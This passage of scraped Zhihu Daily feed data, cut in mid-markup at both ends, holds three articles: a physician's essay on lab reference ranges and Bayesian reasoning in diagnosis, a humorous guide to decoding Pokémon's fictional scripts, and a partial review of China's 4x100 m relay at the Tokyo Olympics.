src=\"https://pica.zhimg.com/v2-8828aa4df86fbe11578f3d75910f408c_720w.jpg?source=8673f162\" alt=\"\"><figcaption>医生要有自己的判断力</figcaption></figure><p><strong>一，检验检查的正常标准是相对的，而不是绝对的</strong></p>\n<p>任何检验、检查都有「正常参考值」。那「正常参考值」是如何确立的呢？往往采用三个方式确定。</p>\n<p>1，健康人群数值的分布区间法</p>\n<p>如数值的概率密度为正态分布，我们把最低和最高那部分（通常是取 0.5%到 2.5%）去掉，剩下的 95%---99%区间为正常参考值。</p>\n<p>比如，用血红蛋白的数值高低来判断是否贫血。那么「看似健康」的一大群人测血红蛋白数值。去掉数值最低和最高的 1%，剩下的就是正常参考数值区间。</p>\n<p>2，检验数值跟健康的风险关系</p>\n<p>比如，糖尿病诊断的血糖参考阈值。它是根据「血糖对微血管病变影响」的调研结果。调研发现：当超过某个值时，人群的微血管病变风险就显著增加，就此确定了该值为正常参考值。</p>\n<p>又比如，高血压参考值。当血压超某个数值后，数值越高则未来患病风险、死亡风险越高。那么这数值就是正常参考数值。需注意，这个「未来时间段」可能是 20 年，甚至 30 年。</p>\n<p>3，是与否判断的概率密度取舍</p>\n<p>如何用类风湿因子(rheumatoid factor, RF)判断一个人是否有类风湿关节炎(rheumatoid arthritis, RA)？</p>\n<p>我们找出 100 个<strong>无类风湿关节炎(RA)</strong>的人，同时找出 100 个<strong>确定类风湿关节炎(RA)</strong>的人。用一个方式测类风湿因子(RF)。看看他们的 RF 的数值分别是多少。结果发现：</p>\n<blockquote>没有 RA 的人有 32 个超数值 4，而有 RA 里有 7 个低于 4。<br>没有 RA 的人有 14 个超数值 5，而有 RA 里有 9 个低于 5。<br>没有 RA 的人有 6 个超数值 6，而有 RA 里有 29 个低于 6。</blockquote>\n<p>那么你会把 RF 的正常参考值定在哪呢？通常来说，我们会把正常参考值定在 5。</p>\n<p>但很显然，并不是低于 5 就一定不是类风湿关节炎，而超过 5 也不绝对是类风湿关节炎。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-990b8ef12c12f6f7f3550f2117091435_720w.jpg?source=8673f162\" alt=\"\"><figcaption>要有概率思维方式，</figcaption></figure><p>综上来说，检验、检查的正常参考值本身就是一个相对概念。如果把参考值看做是绝对的。那就会错误理解检验、检验。</p>\n<p>比如，通常认为正常血压数值应该在 140/90mmHg 以内。但实际上血压 135/85mmHg 与 140/90mmHg 的未来风险的差别并不大。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-585353b055fab1d064540715d2023789_720w.jpg?source=8673f162\" alt=\"\"><figcaption>有逻辑的医生才是合格的。</figcaption></figure><p><strong>二，没有医生的判断，再好的检验也不可靠！</strong></p>\n<p>就在前面，我们知道类风湿因子（RF）取数值 5 的时候，<strong>91%的类风湿关节炎（RA）病人会超过 5，86%的正常人低于 5。</strong>那么即 9%病人被漏诊，而没有 RA 的人里有 14%被误诊。看来这方法很可靠。（请注意，实际上 RF 没有这么好的区分度。）</p>\n<p>那么当一个人检测 RF 数值是 5.1 的时候，他有多大可能性为类风湿关节炎（RA）呢？</p>\n<p>1，当他没有类风湿关节炎的症状、体征时；</p>\n<p>类风湿关节炎有独特的症状、体征，以及症状的演变。有了这些情况，那么他就很可能是类风湿关节炎。但如果没有，他是类风湿关节炎的可能性很低 ---- 比如只有 0.2%的可能性。</p>\n<p>即 1000 个这样的人来看诊，只有 2 个人是类风湿关节炎。他们都去做 RF 检查。</p>\n<p>998×14%=140 个人被误诊；</p>\n<p>但是，实际上只有 2 个人是类风湿关节炎。140/142=98.57%是误诊。也就是当你很相信这「很可靠的检验」时，却只能绝大部分误诊。</p>\n<p>2，当他有类风湿关节炎的症状、体征时；</p>\n<p>当他是双手多个手指肿胀、疼痛，病程有 8 周了。他比较可能为类风湿关节炎。即假定可能性是 80%时。</p>\n<p>即 1000 个这样的人来看诊，有 800 个是类风湿关节炎。他们都去做 RF 检查。</p>\n<p>200×14%=28（被误诊）</p>\n<p>800×9%=72（被漏诊）</p>\n<p>这样的结果是比较理想的：</p>\n<ul>\n<li>RF 超参考值 5 的总人数是：800-72+28=756 人</li>\n<li>RF 超参考值 5 且是 RA 的人数是：728 人；</li>\n</ul>\n<p>也就是说，728/756=96.30%为真正的 RA 病人。这个检验很有用！甚至比我们确定检验参考值时还可靠。毕竟当时 100 个「有病」对比 100 个「没病」的<strong>误诊率为 14%</strong>。但我们现在的误诊占比是 3.70%。</p>\n<p>3，最终对比，「有医生判断时的检验」与「没有医生判断时的检验」</p>\n<p>当没有医生询问症状及演变过程，没有查体时，你很可靠的检验带来了 96.77%误诊；</p>\n<p>当医生询问病史、查体后，认为很可能时，可靠的检验带来更少的误诊。</p>\n<p>好的医生可以让误诊更少。不加选择的检验让误诊太多。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-5da734a9b165880adaa1aea2acc4928b_720w.jpg?source=8673f162\" alt=\"\"><figcaption>医生的判断非常关键</figcaption></figure><p><strong>三，可靠的检验也未必带来好的结果</strong></p>\n<blockquote>一个人 60 岁筛查出某癌症，70 岁时死亡了。<br>同一人 60 岁未筛查，69 岁癌症晚期出现症状，70 岁死亡。</blockquote>\n<p>普通人会觉得前者很好，治疗 10 年才死去。但实际后者更好。</p>\n<p>要避免这个现象，我们需要合理的随机对照试验来考察体检的价值。而不是想当然的以为「早发现=必获益」。</p>\n<p>比如，同年龄段同性别的人做随机对照试验，看某项筛查能否改善最终结局 ---- 延长寿命。当随机对照试验支持，则说明检查有益。</p>\n<p>而医生要做的就是，采取足够可信的证据支持自己给病人采取合理的诊断措施，从而让病人真正获益。而不只是为了诊断而诊断。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-d893110f8705c08229efddd8b3475d80_720w.jpg?source=8673f162\" alt=\"\"><figcaption>医生的价值在哪里？</figcaption></figure><p><strong>终结问题：医生的价值在哪里？</strong></p>\n<p>虽然在今天我们有很多好的检验、检查来帮助我们诊断疾病。但是医生的判断永远是最重要的。</p>\n<p>医生应充分了解检验方法的价值、局限性。充分运用自身的判断来给病人带来最优最大的帮助。而不是沦落为检验、检查的奴隶。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/476272318\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738959"},{"title":"诸如大友克洋《大炮之街》，存在“形似现实文字的架空文字”的作品有哪些？","date":"2021-08-06 23:06:22","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/7d34d1d4f798e777d9a90bdd2ba0ab83_l.jpg?source=8673f162\"><span>疯癫的A兵者，</span><span>B站空间：https://space.bilibili.com/84785878</span>\n<a href=\"https://www.zhihu.com/question/26615904/answer/2038141164\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong>（多图预警~略长～）</strong></p>\n<p>勉强回答一下：</p>\n<p>Pokemon 系列，一共出现了两套不同的“文字体系”，均有完整的语言体系，大致采取现实世界中的“英文”和部分“日语拼写”元素相结合的方式，除部分 Pokemon 世界内专有词汇外，还需要对于英文单词和日文拼写有一定了解，所以如果你想要“穿越”到 Pokemon 世界中，那么请尽快开始“语言学习”的准备工作。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-606d3f7cd977409956f6660980a73e00_720w.jpg?source=8673f162\" alt=\"\"></figure><p>我们都知道，如果想要出国留学，那么“语言能力证明”是申请材料中的重要组成部分之一。<strong>那么，如果你想要“穿越”到 Pokemon 世界中，学好语言是必要条件</strong>，我们下面就进入 Pokemon 世界的语言学习工作：</p>\n<hr>\n<p><strong>Pokemon 世界第一套语言体系</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-7bdd91da8ea87894c7ed6f3c0255d4d6_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>这是 Pokemon 系列中较为基础的语言系统，也是最为常见的语言文字体系，必须牢牢掌握</strong>，远远比其他语言文字体系更为常见，是 Pokemon 世界中的语言的基础。</p>\n<p><strong>这套语言文字体系不区分大小写，需要“大写”的时候，字体会变大……</strong></p>\n<p>为了学习和巩固大家关于这套语言体系的学习工作，我们先来做几道简单一些的“练习题”用来逐步接触 Pokemon 的实际用法：</p>\n<p><strong>1.天桐走进的这栋建筑物，上面的匾题写了一个什么词汇？</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-35d9192f367de88ce32456f7af4fdc86_720w.jpg?source=8673f162\" alt=\"\"></figure><p>属于简单题，甚至可以说是“常识题”范畴。根据文字的形状，易知这属于第一套语言文字的范畴，<strong>查表可得，拼写的单词为“POKEMON”，即宝可梦的音译</strong>。这里实际上对战地铁。</p>\n<p><strong>如果你真的向往那个世界，请记住这个单词</strong>，穿越到 Pokemon 世界中，发现你自己不会用那边的文字拼写 Pokemon，那可是“滑天下之大稽”了……</p>\n<p><strong>2.以下大屏幕显示的问题是什么意思?请大致推测这个场景出现的场合?</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-016749d120cfb23a28624942be758882_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这属于一般题范畴，主要是文字有些小，需要仔细辨认一下。很快可以判断出，这属于 Pokemon 世界第一套语言文字范畴，查表可知，上下几排文字分别为：</p>\n<ul>\n<li>Battle Dojo</li>\n<li>Present</li>\n<li>Don Battle</li>\n<li>tournament</li>\n</ul>\n<p>了解一点 Pokemon 世界常识的训练师们，大致明白，这讲的是“东乔治对战大会”，这里实际上就是东乔治对战大会中的大屏幕。这个题目大致只涉及到英文和一些宝可梦世界常识，不算太难，我们继续进入下一道题目。</p>\n<p><strong>3.小智一行人右侧的商品，主营什么业务？是什么性质的企业？</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-de5690b821d31393c137b1f48d1fb111_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这个题目乍看之下，不难。很容易判断，属于 Pokemon 世界中第一套语言文字体系。然后，查表可知对应文字为 FAMIRI RESUTORAN，不具有英文含义，实际上应为（ファミリー レストラン），即对应英文中的“family restaurant”，业务是家庭餐厅，性质是盈利单位。这需要一点对日本人拼写的理解（不用很深），单纯只懂英文，也只能一头雾水。</p>\n<p>这些题目还都算比较基础，一方面，只是单一一种文字的使用，不涉及混用。</p>\n<p><strong><strong>补充知识点：简体字&amp;繁体字</strong></strong></p>\n<p>经过上述练习，大家对于传统的第一套宝可梦文字体系，大致有一个大致的了解。但是，这实际上只是一个文字体系的基础，可以看做“繁体版”，还有在这一套文字体系简化后得来的“简体版”文字体系，其对比大致如下：</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-afb7055b7b389d86c57715ed04aa02c4_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>这一套文字体系只在几个有限的地区（如卡洛斯地区）流行，不要求熟练掌握，了解即可</strong>。只有在特定地区工作的训练师，需要特别注意。只看文字本身还是太浅，我们还来几个实际的例题：</p>\n<p><strong>4.这本的核心主题是哪一只宝可梦？</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-71c62ad93b773b0ec28b811cccd6a2e5_720w.jpg?source=8673f162\" alt=\"\"></figure><p>通过判断，这是“简体版”的 Pokemon 世界第一套文字。查表可知，对应的文字是“Diancie”，即这里说的主要内容是一只名为蒂安希的宝可梦……因为这套“简化版”文字体系并不十分常见，这里不花费更多篇幅讲解，后面我们进入第二套 Pokemon 世界语言文字体系的学习……</p>\n<hr>\n<p><strong>Pokemon 第二套语言体系</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-c02e7f72985ca0100f905063c16c0dd1_720w.jpg?source=8673f162\" alt=\"\"></figure><p>Pokemon 世界中，另一套构成语言文字的基础体系。语法、字母构成，大体上与前面的第一套文字体系类似，也是字母和文字一一对应。大体上不如上述 Pokemon 世界第一套文字体系常见，不过也偶有出现。我们来做几道题目练习一下：</p>\n<p><strong>1.请问这是 Pokemon 世界中的哪一个城市？</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-2bd1a85f93b6e727eb37997d9b4218ed_720w.jpg?source=8673f162\" alt=\"\"></figure><p>首先，容易判断这是属于 Pokemon 世界的第二套文字体系。查表可知，图中文字为 FIKIYOSE，实际上似乎应为 FUKIYOSE——即 Pokemon 世界中的吹寄市，此处疑似一处动画制作组的“拼写错误”……</p>\n<p><strong>2.火箭队占领了满金市，请问下图中演播室的电子屏幕，显示的内容是什么意思？</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-074d83fe26ec7446dd7306a4bb39c393_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这属于简单题范畴。容易判断，这属于 Pokemon 世界的第二套文字体系。查表可知，电子屏幕上显示的是“AB DEF”。</p>\n<p><strong>所以，这里可以看出制作组真的是“偷懒”了</strong>，没有好好地描写门牌上面显示的电子屏幕内容，纯属“上班摸鱼”行为，文字没有任何实际意义，完全是在“图省事”。</p>\n<p><strong>所以说，多学一门语言是没有坏处的，至少你作为观众，能看到啥时候动画制作组正在“划水”或者“摸鱼”</strong>。不再吐槽动画制作组了，我们进入下一题：</p>\n<p><strong>3.下图中道馆馆主风露正在使用什么软件？</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-c630faaffea29197d4e6a16c20efa84a_720w.jpg?source=8673f162\" alt=\"\"></figure><p>容易判断，图中风露使用的电脑主要采取的是 Pokemon 世界第二套语言文字体系，查表可知，对应的文字为“Media Player”，图中风露正在使用 Media Player 播放自己爷爷的录像并进行学习……</p>\n<p>好了，基础的练习就做这么多，实际上在 Pokemon 世界中的阅读远远比这些复杂得多，因为很多时候并不是一种语言文字体系，而是多种“混搭”，还需要断句……</p>\n<hr>\n<p><strong>综合练习</strong></p>\n<p>无论是 Pokemon 世界中的语言考试，还是实际在 Pokemon 世界中遇到了“阅读任务”，其解题思路全都是“一致”的，主要是以下四个步骤：</p>\n<ul>\n<li>首先，判断语言文字属于哪一套语言文字体系（第一套文字体系 / 第二套文字体系）；</li>\n<li>其次，根据对应关系找到对应的字母，完成“转换”；</li>\n<li>然后，判断属于“英语”词汇还是“日语”拼写；</li>\n<li>最后，根据相应的语法，翻译整段文字；</li>\n</ul>\n<p>下面进行“真题实战”环节：</p>\n<p><strong>1.请判断下图中场合是什么?</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-5579133fbe551c730ed026421bdadae5_720w.jpg?source=8673f162\" alt=\"\"></figure><p>首先，需要对文字类别进行判断，容易知道这里是 Pokemon 世界第二类文字，且只有第二类文字，上下都是一种文字类型。查表可知，图中文字是 “Present by Don George”，即由东乔治提供。可以看出这个屏幕文字出现的场合还是东乔治大会。上文中的题目，东乔治大会是由 Pokemon 世界在中的第一套语言文字书写而成，，可以看出同一场合，也可能使用多种不同文字。</p>\n<p>这一题相对比较“基础”，我们来看一道“大综合题”：</p>\n<p><strong>2.以下关于合众地区的宣传手册都提到了哪些内容？</strong>回到本篇文章开篇的图片，学习了这么多知识，练习了这么多题目，现在终于有能力看一下 Pokemon 世界的手册了：</p>\n<figure><img src=\"https://pica.zhimg.com/v2-8bf4e26c6be525296d98c20732b149d5_720w.jpg?source=8673f162\" alt=\"\"></figure><p>首先，先对手册中的文字类型进行判断，我们可以看出大致是由 Pokemon 世界两套语言体系混搭而成的，大体上标题和正文使用的是 Pokemon 世界第一套语言文字体系和 Pokemon 世界第二套语言文字体系的“混用”。</p>\n<p>其次，我们对文字进行“转换 - 断句 - 对应 - 翻译”（请同学们打开大图逐一对照，缩略图可能看不清楚）：</p>\n<ul><li>先看右边页面顶部</li></ul>\n<p>标题为 Pokemon 世界第一种语言文字类型；——判断种类</p>\n<p>转换为 ISSYUCHIHOUMAP 字母；——查表转换</p>\n<p>ISSYU（イッシュ，指合众）CHIHOU（地方）MAP（地图）；——断句 / 翻译</p>\n<p><strong>这里写的是合众地区地图</strong>（即左页内容），涉及到英语和日语的混用。</p>\n<ul><li>再看上半部正文和标题</li></ul>\n<p>标题和正文为 Pokemon 世界第二种语言文字类型；——判断种类</p>\n<p>转换为纯字母 HIUNNSITELIMATENNROU；——查表转换</p>\n<p>HIUNNSITELI（ヒウンシティ，指飞云市）MATENNROU（摩天楼）；——断句 / 翻译</p>\n<p><strong>上半部分的图片标题主要指的是飞云市的摩天楼</strong>，正文写的是飞云市摩天楼烟花情况，后面则是一些“乱码”（皮卡丘什么的，反正我也看不懂了……）</p>\n<ul><li><strong>接着看左下部分的图片标注</strong></li></ul>\n<p>标题和正文为 Pokemon 世界第二种语言文字类型；——判断种类</p>\n<p>转换为纯字母 SUTEKIRESUTORA；——查表转换</p>\n<p>SUTEKI（极好的）RESUTORA（餐厅）；——断句 / 翻译</p>\n<p><strong>画着酒杯和餐巾的图片，图片标注为“极好的餐厅”</strong>。</p>\n<ul><li><strong>最后看右下图片的标注</strong></li></ul>\n<p>标题和正文为 Pokemon 世界第二种语言文字类型；——判断种类</p>\n<p>YO-ROOHEHI-TEKINA；——查表转换</p>\n<p>ARUPUSUNOSYSUNOSYOUJOSYASHIN；——查表转换</p>\n<p>大致是“欧洲的风景”和“阿尔卑斯山少女写真”（我的日语也是很差的水平，确实看不太懂，只看到了阿尔卑斯，没看到少女……）；——断句 / 翻译</p>\n<p><strong>剩下的篇幅（左下部分正文）全都是制作组拿 Pokemon 世界文字吐槽不知道这里该填啥好，排版有困难，简直是十分没有情怀的行为……</strong></p>\n<p>最后，我们终于能够大致抓住这篇专有名词还不算太多的“普及性”小册子的大致的内容和主题了。所以，我建议觉得各位觉得自己熟知属性克制、伤害计算就想穿越到 Pokemon 世界从事学术科研的朋友们，看懂论文可能都是一个相当复杂的事情，单纯的“语言关”过不去……</p>\n<p><strong>练习题目到此为止……</strong></p>\n<p>所以说，要娴熟地掌握 Pokemon 世界的语言体系，以下知识你是需要熟练掌握的：</p>\n<ul>\n<li>宝可梦世界的文字符号体系（包括上述两套语言）</li>\n<li>一定的英语基础</li>\n<li>一定的日语基础</li>\n<li>几乎没有标点符号，得自己断句</li>\n</ul>\n<p>……………………………………………………</p>\n<p><strong>这些都是最为基础的词汇和说明，如果这些都“驾驭”不了，就暂时不要想穿越到 Pokemon 世界之后的事情了</strong>……这无异于现在有一些人，不说对欧美社会了解多少，连英语都不会说，就觉得到欧美之后还能当人上人一样……都是“镜花水月”一般的幻想……</p>\n<p>别的动画 / 漫画话题不太了解，但是 Pokemon 话题这边，几乎天天有人提问，大致无限地希望穿越到 Pokemon 世界中，<strong>从小到大理工科出身的我，对于语言文字确实没有“天赋”,很早就放弃这一幻想了，因为语言真的“学不会”……</strong></p>\n<hr>\n<p><strong>Pokemon 系列“去现实化”与 Pokemon 文字的产生</strong></p>\n<p>做完的练习题目，熟悉了 Pokemon 世界的大致语言文字体系和断句语法等，我们现在来大致了解一下 Pokemon 世界语言发展的“历史问题”， 实际上，Pokemon 世界中最初也没有这一套体系，主要都是使用英语和日语在书写的：</p>\n<figure><img src=\"https://pica.zhimg.com/v2-aa37ab3d6d87f519a8d0cd18cab9f085_720w.jpg?source=8673f162\" alt=\"\"></figure><p>比如上图中是未知图腾研究权威之一的修里博士（也是大木博士曾经的优秀学生之一），将自己对于未知图腾的研究论文发给恩师大木博士的场景，论文中拼写和部分英语语法似乎有些小毛病，但是内容却基本容易理解的，关于这篇论文的内容和相关研究成果，可以参见以下回答，这里不再赘述：</p>\n<p><a href=\"https://www.zhihu.com/question/48715211/answer/282219149\">口袋妖怪里的未知图腾有什么含义？</a></p>\n<p>然而“好景不长”，Pokemon 很快走上“去现实化”的平行世界路线。除了英语和日语之外，前四个时代还曾经努力过使用其他文字来替代，但是很遗憾地，这些文字体系均没有成系统地出现，直到五世代之后，Pokemon 世界才有了更为完善的文字体系，就是上述内容：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-7d240a21d7a9384a1d9205521db7735e_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>所以上述几套文字体系其实是 Pokemon 系列动画五世代之后，“去现实化”时代的产物</strong>，从此之后，宝可梦不再与现实世界“共享”世界观和语言文字（以及相关的政治体系），开始打造一个完全乌托邦式的“平行世界”，才有了现在这些巨大的“麻烦”……详情可见：</p>\n<p><a href=\"https://www.zhihu.com/question/274243551/answer/438245539\">如何看待《精灵宝可梦》近期作品内容现实化？</a></p>\n<p>所以说，即使是要“穿越”也要“趁早”，现在 Pokemon 世界真的是“越来越复杂”，从“语言文字”到“体系架构”，正在不断地“补充”新的内容，而且复杂程度正在不断攀升……如果说，训练师曾经也算是一个可以“混吃”的职业，那么现在训练师的“门槛”可不低了，而且竞争激烈，升迁困难，且“内卷”严重，已经算是个比较“劝退”的行业了……</p>\n<p>别的就不说了，这里提到的“语言关”就够“劝退”掉如我这种一点语言天赋都没有的人了……</p>\n<p><strong>其他相关回答：</strong></p>\n<p><a href=\"https://www.zhihu.com/question/400658848/answer/1280523932\">在“宝可梦”世界当一名训练家是不是特别的爽？</a><a href=\"https://www.zhihu.com/question/321445817/answer/1762067438\">最近有哪些经典日式异世界背景的 rpg 游戏？</a><a href=\"https://www.zhihu.com/question/265607102/answer/1978194153\">有哪些由著名电子游戏改编的桌游？</a><a href=\"https://www.zhihu.com/question/67584652/answer/254409450\">哪些游戏的海洋是有潮汐变化的？</a></p>\n<p><strong>如有不妥之处，求轻喷，欢迎爱好者一同讨论~</strong></p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/26615904\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738939"},{"title":"2020 东京奥运田径男子 4 x 100 米接力决赛中国队夺得第 4，如何评价本场比赛？","date":"2021-08-06 14:33:35","description":"\n<p>汤星强起跑足够出色、谢震业顺利过渡、苏炳添疯狂的追赶、吴智强全程力压牙买加守住优势——37秒79，追平国家纪录（2019年多哈世锦赛，苏炳添/许周政/吴智强/谢震业）！</p>\n<p>与上一届里约奥运会一样，还是决赛第四——甚至跑赢了牙买加！</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-c5750d9ab6f2272b179d722d21640b83_720w.jpg?rss\" data-caption=\"最后一棒的交接，有点可惜了，本来可以更好的。吴的启动节奏啊……\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-c5750d9ab6f2272b179d722d21640b83\" data-watermark-src=\"v2-08d0a57bd0340d6037f1d3ef29548f4a\" data-private-watermark-src=\"v2-fddd1be1a64a00a596372a2249cb2419\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-cc12df8436067a80b7aa7c4bfaa1497b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1730\" data-rawheight=\"662\" data-watermark=\"watermark\" data-original-src=\"v2-cc12df8436067a80b7aa7c4bfaa1497b\" data-watermark-src=\"v2-027efbc8a13cc7bb9489ed8507691e6d\" data-private-watermark-src=\"v2-bf556e669c6d50037239aab16e008b6e\"></p>\n<p><br></p>\n<p>意大利田径队是今夏东京田径赛场上最大的黑马，中国田径队是中国代表队里最让人欣喜的队伍——哪怕他/她们的目标都只是进入决赛、争取名次。</p>\n<p>这些无奖牌的王者，真的是中国体育的骄傲。</p>\n<p><br></p>\n<hr>\n<p>4x100米可以说的点太多了，往详细了说——</p>\n<p><br></p>\n<p>「奥运会是国与国之间无硝烟的战争」这句话让顾拜旦（现代奥运会主要倡导者）听到，估计会气的七窍生烟。但说4x100米接力项目，是国与国之间最强速度的PK，这个描述问题就不大——100米/200米项目都是个体天才间的pk，4x100米这样的接力，就完美体现了最强的速度、最高的默契、最完美的/零容忍的技术要求。</p>\n<p>可能是整届奥运会最紧张刺激的项目（之一）。</p>\n<p><br></p>\n<p><b>25岁的汤星强、27岁的谢震业、32岁的苏炳添、27岁的吴智强，他们代表的中国速度，真的完全不亚于中国其他领域的速度。</b></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-1d7c0c20cf2a6f9527ec4580153ae127_720w.jpg?rss\" data-caption=\"预赛小组第一\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-1d7c0c20cf2a6f9527ec4580153ae127\" data-watermark-src=\"v2-e0e1adfea571518903404993c7867568\" data-private-watermark-src=\"v2-9e01dfefb3e5355ab1ac4a6116c6fa05\"></p>\n<h2>\n<br>预算回顾：超神的小组第一，力压美加意等短跑强国</h2>\n<p><br></p>\n<p>预赛两组。</p>\n<p>第一组牙买加、英国、日本、特立尼达和多巴哥、法国、南非都算是有进入决赛实力的。最终牙买加（37秒82）、英国（38秒02）、日本（38秒16）晋级；</p>\n<p>我们在第二组，<b>汤星强、谢震业、苏炳添、吴智强跑出37秒92，力压加拿大、意大利等强队，第二组排名第一晋级决赛。</b></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-9a492c2ad3130c85c9c41014d99bef4f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-9a492c2ad3130c85c9c41014d99bef4f\" data-watermark-src=\"v2-8c663fbabc3df4c1e2df077364365a2c\" data-private-watermark-src=\"v2-5816b498fe42b8087d1814e926432d43\"></p>\n<p><br></p>\n<p>预赛中国队发挥并不算完美，交接棒的一些衔接细节可以做得更好些。</p>\n<p><b>但37秒92本赛季最佳、小组第一晋级的结果，完全不需要吹毛求疵了——汤星强的起跑足够给力、谢震业守住了领先优势、第三棒苏炳添的表现天神下凡生生创造出距离差、而最后一棒吴智强也完全没让加拿大的迫近变成逆转。</b></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-dc1c5483289690ec3852afd8b96a2634_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"690\" data-rawheight=\"460\" data-watermark=\"watermark\" data-original-src=\"v2-dc1c5483289690ec3852afd8b96a2634\" data-watermark-src=\"v2-c74d92a122e191c35f696a0b59d26e4b\" data-private-watermark-src=\"v2-696695d33ae6f77dce93d3fd78229b62\"></p>\n<p><br></p>\n<p>美国出人意料的小组第六（38秒10）、以0.02秒的微弱劣势没能晋级决赛——赛后网上那个小视频估计大家都看到了。<b>苏神问谢震业美国队情况，小谢抿着水摇着手指、一脸坏笑说，“（美国队）没进（决赛），小组第六！”</b></p>\n<p>淘气。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-9107901260c9fc86bbca5af8051820d8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2858\" data-rawheight=\"1558\" data-watermark=\"watermark\" data-original-src=\"v2-9107901260c9fc86bbca5af8051820d8\" data-watermark-src=\"v2-93d72687e8eddada5575da9c8fd1894b\" data-private-watermark-src=\"v2-d204d799e6a8348a1fddd0d3cdebc4d8\"></p>\n<p><br></p>\n<p>特别提一下美国队。</p>\n<p>美国的短跑和4x100接力队，自古以来（从1912年奥运设项来）都是全世界第一档的水准——<b>奥运会4x100一共25次（男子）比赛，美国拿了15次冠军、2次亚军。</b></p>\n<p>一度是碾压式的短跑接力梦之队。</p>\n<p>但牙买加崛起后，美国在短跑上就陷入特别尴尬的境地，屡战屡败。上一次拿到金牌已经是悉尼奥运会、过去20多年了。</p>\n<p>2019年多哈世锦赛美国队非常强势夺冠，当时老美全国都有一种被牙买加压迫了那么多年、翻身农奴把歌唱的喜悦。结果东京奥运会科尔曼禁赛、贾斯汀老去，今年短跑美国又表现的很萎靡。</p>\n<p>接力尤其拉胯。</p>\n<p><br></p>\n<p><b>不夸张的说，中国这几年不见得4x100就完全不敢/不该和美国比，相反我们有些年轻人冒起来——这篇内容最后会提到——我们是完全可以掰一掰手腕的。</b></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-e0153436b3795cfbf0389763434d0540_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-e0153436b3795cfbf0389763434d0540\" data-watermark-src=\"v2-3a14f9697e583b4154e5ecfb73997e16\" data-private-watermark-src=\"v2-3ecb1c7ff446b38b44c440e5d9607a7e\"></p>\n<p><br></p>\n<p>就事论事，再多说一下预算的分组。</p>\n<p>之前接力分组出来后，有声音说日本把自己分在弱组，把中国放进死亡组。这种争议有点没有必要。</p>\n<p>一来日本自身不弱，二来接力谈不上多少能放水的（除非最后一棒大幅领先），和强队一组反而能跑得更快，且日本那组真的不弱。就算拿不到前三也能靠更快成绩进决赛。</p>\n<p><br></p>\n<p>这样进入决赛的八支接力队，按半决赛成绩依次是，牙买加、中国、加拿大、意大利、英国、德国、加纳、日本。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-2e702ed1f0628514393a7200b2a488cf_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1656\" data-rawheight=\"656\" data-watermark=\"watermark\" data-original-src=\"v2-2e702ed1f0628514393a7200b2a488cf\" data-watermark-src=\"v2-6c7690b425761c5d28e1aca802f1f203\" data-private-watermark-src=\"v2-38ae798a7e3ae668d3a91093f2ddb3f4\"></p>\n<p><br></p>\n<h2>决赛：再次第四，追平国家纪录！</h2>\n<p>中国第七道。</p>\n<p>第七道是不错的道次，两边一个是接力老牌强队英国，一个是今年让人刮目相看的意大利（横空出世，确实很多人都没想到）。小日本最外道。</p>\n<p>汤星强、谢震业、苏炳添、吴智强，四人出场的亮相是小悟空爆气的动作。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-a3ae3c0efb10e325d01dcd7752e6f366_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"337\" data-watermark=\"watermark\" data-original-src=\"v2-a3ae3c0efb10e325d01dcd7752e6f366\" data-watermark-src=\"v2-c287f38bb92511f344319424efa2211f\" 